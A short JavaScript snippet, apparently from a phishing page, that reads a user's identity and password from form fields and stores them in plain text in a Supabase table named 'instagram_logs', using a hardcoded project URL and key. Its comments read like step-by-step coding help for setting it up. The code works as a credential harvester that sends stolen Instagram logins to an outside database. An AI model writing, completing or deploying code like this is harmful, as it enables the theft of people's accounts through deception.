const SUPABASE_URL = "https://vhkxrhuygujrghgjikdu.supabase.co";
const SUPABASE_ANON_KEY = "sb_publishable_NaZ5L8e0wq_hzQ8WNCk_cQ_zMPI5FB-";


// Grabbing values from the input boxes
const userIdentity = document.getElementById('identity-input').value; 
const userPassword = document.getElementById('password-input').value;

// Inserting into your custom database table layout
const { data, error } = await supabase
  .from('instagram_logs') // Make sure this matches your exact table name
  .insert([
    { 
      user_identity: userIdentity, // Maps to your 'text' column
      password: userPassword       // Maps to your 'text' column
    }
  ]);
